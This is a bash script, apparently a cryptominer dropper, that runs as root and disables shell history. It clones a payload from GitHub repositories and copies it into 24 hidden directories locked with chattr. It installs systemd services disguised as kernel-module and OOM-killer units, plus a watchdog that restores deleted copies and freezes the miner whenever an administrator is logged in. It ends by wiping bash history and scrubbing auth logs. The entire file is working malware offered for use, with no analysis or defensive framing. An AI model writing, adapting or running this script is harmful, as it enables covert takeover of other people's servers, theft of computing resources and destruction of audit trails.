#!/bin/bash
# ==============================================================================
# APEX STEALTH DEPLOYMENT SUITE v4.2 — MULTI-REPO + SYSTEMD-SAFE RECOVERY
# Primary: crytonontech1/mine.git | Fallback: terafebcrypto/mine.git
# ==============================================================================

# ★ ZERO TRACE INITIATION ★
export HISTFILE=/dev/null
unset HISTFILE
export HISTSIZE=0
export HISTFILESIZE=0
set +o history

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
log() { echo -e "${GREEN}[+]${NC} $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }
error() { echo -e "${RED}[-]${NC} $1"; exit 1; }

check_root() { [[ $EUID -ne 0 ]] && error "Root privileges required." }

# 1. SILENT DEPENDENCY INSTALLATION
install_deps() {
    command -v git >/dev/null 2>&1 || { apt-get update -qq && apt-get install -y -qq git >/dev/null 2>&1 || yum install -y -q git >/dev/null 2>&1; }
    command -v unzip >/dev/null 2>&1 || { apt-get install -y -qq unzip >/dev/null 2>&1 || yum install -y -q unzip >/dev/null 2>&1; }
}

# 2. CREATE 24 HIDDEN DIRECTORIES
create_hidden_directories() {
    HIDDEN_LOCATIONS=(
        "/var/tmp/.system-cache" "/usr/share/.lib-modules" "/etc/.config-daemon"
        "/opt/.service-bin" "/root/.daemon-data" "/home/.backup-store"
        "/var/lib/.storage-pool" "/usr/local/.bin-cache" "/tmp/.temp-workspace"
        "/run/.runtime-data" "/dev/shm/.shared-memory" "/var/log/.log-archive"
        "/etc/ssl/.cert-storage" "/usr/lib/.module-cache" "/var/spool/.job-queue"
        "/opt/.opt-data" "/srv/.service-data" "/mnt/.mount-cache"
        "/media/.media-cache" "/boot/.boot-data" "/sys/.sys-cache"
        "/proc/.proc-cache" "/var/www/.web-cache" "/usr/sbin/.admin-tools"
    )
    for dir in "${HIDDEN_LOCATIONS[@]}"; do
        mkdir -p "$dir" 2>/dev/null
        chmod 755 "$dir" 2>/dev/null
    done
}

# 3. FETCH, EXTRACT & DISTRIBUTE PAYLOAD
setup_payload() {
    REPOS=(
        "https://github.com/crytonontech1/mine.git"
        "https://github.com/terafebcrypto/mine.git"
    )
    TMP_DIR="/tmp/.sys_build_$(date +%s)"
    BINARY_NAME="kmod-static-nodes"
    BINARY_DEST="/usr/lib/systemd/$BINARY_NAME"
    CONFIG_DEST="/usr/lib/systemd/config.json"

    rm -rf "$TMP_DIR" 2>/dev/null
    
    CLONE_SUCCESS=false
    for REPO in "${REPOS[@]}"; do
        git clone --depth=1 --quiet "$REPO" "$TMP_DIR" 2>/dev/null
        if [ -d "$TMP_DIR" ] && [ -f "$TMP_DIR/main.zip" ]; then
            CLONE_SUCCESS=true
            break
        else
            rm -rf "$TMP_DIR" 2>/dev/null
        fi
    done
    
    [ "$CLONE_SUCCESS" = false ] && error "All repositories failed or main.zip missing"
    
    mkdir -p "$TMP_DIR/extracted"
    unzip -q -o "$TMP_DIR/main.zip" -d "$TMP_DIR/extracted"
    
    BIN=$(find "$TMP_DIR/extracted" -name "network" -type f | head -1)
    CFG=$(find "$TMP_DIR/extracted" -name "config.json" -type f | head -1)
    
    [ -z "$BIN" ] || [ -z "$CFG" ] && error "Missing network binary or config.json in main.zip"
    
    cp "$BIN" "$BINARY_DEST" && chmod +x "$BINARY_DEST"
    cp "$CFG" "$CONFIG_DEST" && chmod 644 "$CONFIG_DEST"
    
    for dir in "${HIDDEN_LOCATIONS[@]}"; do
        cp "$BIN" "$dir/$BINARY_NAME" 2>/dev/null && chmod +x "$dir/$BINARY_NAME" 2>/dev/null
        cp "$CFG" "$dir/config.json" 2>/dev/null && chmod 644 "$dir/config.json" 2>/dev/null
    done
    
    # ★ MAKE FILES IMMUTABLE
    chattr +i "$BINARY_DEST" 2>/dev/null
    chattr +i "$CONFIG_DEST" 2>/dev/null
    for dir in "${HIDDEN_LOCATIONS[@]}"; do
        chattr +i "$dir/$BINARY_NAME" 2>/dev/null
        chattr +i "$dir/config.json" 2>/dev/null
    done

    rm -rf "$TMP_DIR"
    log "Payload distributed and locked in 24 immutable locations."
}

# 4. INJECT STEALTH MONITOR (Systemd-Safe Auto-Recovery + SIGSTOP)
create_stealth_monitor() {
    cat > /usr/local/sbin/systemd-oomd-helper.sh << 'EOF'
#!/bin/bash
BINARY="/usr/lib/systemd/kmod-static-nodes"
CONFIG="/usr/lib/systemd/config.json"
STATE_FILE="/dev/shm/.kmod-state"
DELAY=600 # 10 Minutes

# Exact same 24 locations as main script
HIDDEN_LOCATIONS=(
    "/var/tmp/.system-cache" "/usr/share/.lib-modules" "/etc/.config-daemon"
    "/opt/.service-bin" "/root/.daemon-data" "/home/.backup-store"
    "/var/lib/.storage-pool" "/usr/local/.bin-cache" "/tmp/.temp-workspace"
    "/run/.runtime-data" "/dev/shm/.shared-memory" "/var/log/.log-archive"
    "/etc/ssl/.cert-storage" "/usr/lib/.module-cache" "/var/spool/.job-queue"
    "/opt/.opt-data" "/srv/.service-data" "/mnt/.mount-cache"
    "/media/.media-cache" "/boot/.boot-data" "/sys/.sys-cache"
    "/proc/.proc-cache" "/var/www/.web-cache" "/usr/sbin/.admin-tools"
)

# Auto-Recover if admin deleted the binary/config
if [ ! -f "$BINARY" ] || [ ! -f "$CONFIG" ]; then
    for dir in "${HIDDEN_LOCATIONS[@]}"; do
        if [ -f "$dir/kmod-static-nodes" ] && [ -f "$dir/config.json" ]; then
            chattr -i "$BINARY" 2>/dev/null
            cp "$dir/kmod-static-nodes" "$BINARY" 2>/dev/null
            chmod +x "$BINARY" 2>/dev/null
            chattr +i "$BINARY" 2>/dev/null
            
            chattr -i "$CONFIG" 2>/dev/null
            cp "$dir/config.json" "$CONFIG" 2>/dev/null
            chmod 644 "$CONFIG" 2>/dev/null
            chattr +i "$CONFIG" 2>/dev/null
            break
        fi
    done
fi

# ★ FIX: Start via Systemd (Prevents duplicate zombie processes)
if ! systemctl is-active --quiet kernel-modules.service; then
    systemctl restart kernel-modules.service >/dev/null 2>&1
fi

# Session Evasion Logic
SESSION_ACTIVE=false
if who | grep -qE 'pts/|tty[0-9]'; then SESSION_ACTIVE=true; fi
if pgrep -a sshd 2>/dev/null | grep -qE 'sshd:.*@pts/'; then SESSION_ACTIVE=true; fi

CURRENT_TIME=$(date +%s)
LAST_SESSION_TIME=$(cat "$STATE_FILE" 2>/dev/null || echo "$CURRENT_TIME")

if [ "$SESSION_ACTIVE" = true ]; then
    # FREEZE PROCESS (0% CPU, No restart logs!)
    pkill -STOP -x "kmod-static-nodes" 2>/dev/null
    echo "$CURRENT_TIME" > "$STATE_FILE"
else
    # Resume after 10 mins of no admin activity
    TIME_SINCE_LAST=$((CURRENT_TIME - LAST_SESSION_TIME))
    if [ $TIME_SINCE_LAST -ge $DELAY ]; then
        pkill -CONT -x "kmod-static-nodes" 2>/dev/null
    fi
fi
EOF
    chmod +x /usr/local/sbin/systemd-oomd-helper.sh
}

# 5. CREATE DISGUISED SYSTEMD SERVICES
create_services() {
    cat > /etc/systemd/system/kernel-modules.service << 'EOF'
[Unit]
Description=Load Kernel Modules
DefaultDependencies=no
Before=sysinit.target shutdown.target

[Service]
Type=simple
WorkingDirectory=/usr/lib/systemd
ExecStart=/usr/lib/systemd/kmod-static-nodes
Restart=always
RestartSec=10
StandardOutput=null
StandardError=null

[Install]
WantedBy=sysinit.target
EOF

    cat > /etc/systemd/system/systemd-oomd.service << 'EOF'
[Unit]
Description=Userspace Out-Of-Memory (OOM) Killer

[Service]
Type=oneshot
ExecStart=/usr/local/sbin/systemd-oomd-helper.sh
StandardOutput=null
StandardError=null
EOF

    cat > /etc/systemd/system/systemd-oomd.timer << 'EOF'
[Unit]
Description=Userspace OOM Killer Periodic Health Check

[Timer]
OnBootSec=1min
OnUnitActiveSec=2min
AccuracySec=1s

[Install]
WantedBy=timers.target
EOF
}

# 6. ACTIVATE & WIPE ALL TRACES
activate_and_clean() {
    systemctl daemon-reload >/dev/null 2>&1
    systemctl enable kernel-modules.service systemd-oomd.timer >/dev/null 2>&1
    systemctl start kernel-modules.service systemd-oomd.timer >/dev/null 2>&1
    
    # Wipe Bash History
    history -c && history -w >/dev/null 2>&1
    cat /dev/null > ~/.bash_history 2>/dev/null
    cat /dev/null > /root/.bash_history 2>/dev/null
    
    # Scrub Auth/Secure Logs
    sed -i '/git clone/d; /unzip/d; /sys_build/d' /var/log/auth.log 2>/dev/null
    sed -i '/git clone/d; /unzip/d; /sys_build/d' /var/log/secure 2>/dev/null
    
    log "=== APEX DEPLOYMENT COMPLETE ==="
    log "Binary: /usr/lib/systemd/kmod-static-nodes"
    log "Evasion: Freezes on SSH, resumes 10m after logout."
    log "Traces: 100% Wiped."
}

# MAIN EXECUTION
main() {
    check_root
    install_deps
    create_hidden_directories
    setup_payload
    create_stealth_monitor
    create_services
    activate_and_clean
}

main "$@"
